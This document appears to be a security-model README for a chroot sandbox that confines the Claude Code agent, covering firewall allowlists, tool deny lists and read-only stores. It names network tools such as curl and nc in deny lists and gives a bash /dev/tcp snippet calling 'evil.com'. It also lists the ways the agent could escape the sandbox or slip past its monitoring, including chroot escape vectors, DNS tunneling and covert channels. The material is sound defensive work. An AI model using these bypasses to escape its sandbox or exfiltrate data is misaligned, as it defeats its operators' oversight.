# Security Model

This document explains the security benefits and limitations of the Claude chroot environment.

## Defense in Depth

The POC implements multiple layers of security:

```
┌─────────────────────────────────────────────────────────────────┐
│ Layer 1: Chroot Filesystem Isolation                            │
│   - Claude sees only /srv/claude-chroot as root                │
│   - Cannot access host /home, /etc, or other directories       │
│   - Runs as unprivileged user (UID 1000)                       │
├─────────────────────────────────────────────────────────────────┤
│ Layer 2: Network Firewall (nftables)                           │
│   - Allowlist-based: only specific IPs permitted               │
│   - Blocks all outbound except Anthropic API + Nix cache       │
│   - Logged drops for audit: "claude-blocked:" prefix           │
├─────────────────────────────────────────────────────────────────┤
│ Layer 3: Claude Managed Settings                                │
│   - Denies WebSearch, WebFetch, curl, wget, etc.               │
│   - Denies package manager network operations                   │
│   - Immutable file (chattr +i) - cannot be modified            │
├─────────────────────────────────────────────────────────────────┤
│ Layer 4: Minimal Environment                                    │
│   - No unnecessary tools installed                              │
│   - Read-only Nix store                                        │
│   - Workspace is only writable user directory                  │
└─────────────────────────────────────────────────────────────────┘
```

## Security Benefits

### 1. Filesystem Isolation

**What's protected:**
- Your home directory (`~/.ssh`, `~/.gnupg`, `~/.aws`, etc.)
- System configuration (`/etc/passwd`, `/etc/shadow`)
- Other users' files
- System binaries (read-only access only)

**What Claude can access:**
- `/workspace` - your project (read/write)
- `/home/claude/.claude` - Claude's own config
- `/nix` - package store (read-only)
- `/tmp` - temporary files (tmpfs, cleared on exit)

### 2. Network Isolation

**Allowed traffic (UID 1000 only):**
- Anthropic API: `160.79.104.0/23`, `160.79.104.0/21`
- Auth endpoints: `console.anthropic.com`, `platform.claude.com`, `claude.ai`
- Telemetry: `statsig.anthropic.com`
- Nix cache: `cache.nixos.org`
- DNS: Port 53 (required for hostname resolution)

**Blocked traffic:**
- All other outbound connections
- Connections are logged to kernel log with `claude-blocked:` prefix

**Why this matters:**
- Claude cannot exfiltrate code to arbitrary servers
- Cannot download malware or backdoors
- Cannot connect to C2 servers
- Cannot make requests on your behalf to other services

### 3. Tool Restrictions (Managed Settings)

Even if Claude tried to use network tools, they're explicitly denied:

| Category | Denied Tools |
|----------|-------------|
| Web access | `WebSearch`, `WebFetch` |
| Download | `curl`, `wget`, `aria2c`, `httpie` |
| Network | `nc`, `telnet`, `ssh`, `scp`, `rsync` |
| Git (network) | `git clone`, `git fetch`, `git pull`, `git push` |
| Package managers | `npm install`, `pip install`, `cargo install`, etc. |

**Immutability:** The settings file has `chattr +i` set, making it immutable even to root inside the chroot.

### 4. Nix Store Isolation (Read-Only Cache)

The Nix store (`/nix`) is bind-mounted from the host, but this provides a **closed system** that prevents Claude from expanding its toolset.

**How it works:**

```
Host System                          Chroot
┌─────────────────┐                 ┌─────────────────┐
│ /nix/store/     │ ──bind mount──▶ │ /nix/store/     │
│  (read-write)   │                 │  (read-only)    │
│                 │                 │                 │
│ Contains only   │                 │ Cannot add new  │
│ packages you've │                 │ packages here   │
│ installed       │                 │                 │
└─────────────────┘                 └─────────────────┘
```

**Why this matters:**

1. **No package fetching:** Even if Claude tried to run `nix-shell -p evil-tool`:
   - If the package isn't already in your local `/nix/store/`, Nix would try to fetch it
   - The fetch fails because the Nix store is mounted read-only (can't write new packages)
   - Even if the store were writable, nftables only allows `cache.nixos.org` for Nix - not arbitrary package sources
   - Claude is limited to **exactly the tools that already exist in your host's Nix store**

2. **Pre-determined toolset:** The `shell.nix` in the chroot references a specific nixpkgs snapshot (the one on your host). Claude gets:
   - `claude-code` (the agent itself)
   - `bash`, `coreutils`, `git`, `ripgrep`, etc. (standard dev tools)
   - Nothing else, unless you've installed it on the host

3. **No privilege to install:** Even if network were unrestricted:
   ```bash
   # Inside chroot - this fails
   nix-env -iA nixpkgs.netcat
   # Error: cannot write to /nix/store (read-only)

   nix profile install nixpkgs#netcat
   # Error: cannot write to /nix/var/nix (read-only)
   ```

4. **Managed settings as backup:** The `managed-settings.json` also denies:
   - `Bash(nix-env:*)`
   - `Bash(nix profile:*)`

   So even attempting these commands would be blocked before hitting the read-only filesystem.

**Comparison to container approaches:**

| Approach | Can fetch new packages? | Toolset |
|----------|------------------------|---------|
| Docker (network) | Yes | Unlimited |
| Docker (no network) | No | Image contents |
| This chroot | No | Host's Nix store (mounted read-only) |

**Implication for attackers:**

If Claude (or code Claude writes) wanted to:
- Download `netcat` to open a reverse shell → blocked (not in store + network blocked)
- Install `nmap` to scan networks → blocked (not in store)
- Add `curl` if missing → blocked (can't write to store)

The only tools available are those **you explicitly have on your NixOS host**, and Claude cannot expand beyond that boundary.

### 5. Privilege Separation

- Setup/enter scripts run as root (required for chroot, mounts)
- Claude runs as unprivileged `claude` user (UID 1000)
- nftables rules only affect UID 1000, not host processes
- Bind mounts are read-only where possible

### 6. Audit Trail

**Blocked connections are logged:**
```bash
# View blocked connection attempts
sudo journalctl -k | grep "claude-blocked"
```

**IP allowlist is versioned:**
- `allowed-ips.conf` shows exactly what IPs are permitted
- Sync script shows diffs before applying changes
- You can review/veto any IP changes

## Known Limitations & Risks

### Chroot Escape Vectors

Chroot is **not a security boundary** - it's a convenience isolation mechanism. Known escape vectors:

| Vector | Status | Mitigation |
|--------|--------|------------|
| Root access | Mitigated | Claude runs as UID 1000, not root |
| `/proc` escape | Partial | Bind-mounted, some info visible |
| `/sys` escape | Partial | Bind-mounted read-only |
| Device nodes | Partial | `/dev` bind-mounted, limited devices |
| Ptrace | Risk | Could attach to other processes if permitted |
| Hardlinks to setuid | Mitigated | No setuid binaries in chroot |

**Recommendation:** For stronger isolation, consider:
- namespaces (`unshare`)
- seccomp filters
- Container runtimes (podman/docker with `--security-opt`)
- Full VMs

### Network Bypass Vectors

| Vector | Status | Notes |
|--------|--------|-------|
| DNS tunneling | Risk | DNS (port 53) is allowed for resolution |
| ICMP tunneling | Blocked | Only TCP ports 80/443 allowed |
| Covert channels via allowed hosts | Risk | Could encode data in API requests |
| IPv6 escape | Partial | IPv6 CIDR added but less tested |

### Managed Settings Bypass

| Vector | Status | Notes |
|--------|--------|-------|
| Direct file edit | Blocked | File is immutable (chattr +i) |
| Rename/replace | Blocked | Immutable flag prevents this |
| Python/Node HTTP | Risk | Can make requests without curl/wget |
| `/dev/tcp` (bash) | Risk | Bash built-in, no binary needed |

**Example bypass Claude could attempt:**
```bash
# Using bash /dev/tcp (if available)
exec 3<>/dev/tcp/evil.com/80
echo -e "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n" >&3
cat <&3
```
This would be **blocked by nftables** (layer 2), but not by managed settings (layer 3).

### Authentication Risks

- OAuth tokens are synced from host `~/.claude/`
- If chroot is compromised, attacker has your Claude credentials
- API key (if used) is passed as environment variable

## Recommendations

### For Higher Security

1. **Use a VM instead of chroot** for true isolation
2. **Disable `/proc` and `/sys`** if not needed for your use case
3. **Use seccomp** to restrict system calls
4. **Network namespace** (`unshare --net`) for complete network isolation
5. **Separate user** - create a dedicated user instead of UID 1000

### For Production Use

1. **Audit logging** - ship `claude-blocked` logs to SIEM
2. **IP allowlist review** - manually verify IPs before sync
3. **Regular updates** - re-sync IPs as Anthropic infrastructure changes
4. **Backup credentials** - don't store only copy of API key in chroot

### For Paranoid Mode

```bash
# Enter with NO network at all
sudo sh scripts/claude-chroot-enter.sh --no-network /path/to/project
```

This uses `unshare --net` to create an isolated network namespace with no connectivity. **Note:** Claude requires API access to function, so this mode is only useful for testing the chroot setup, not for actual Claude usage.
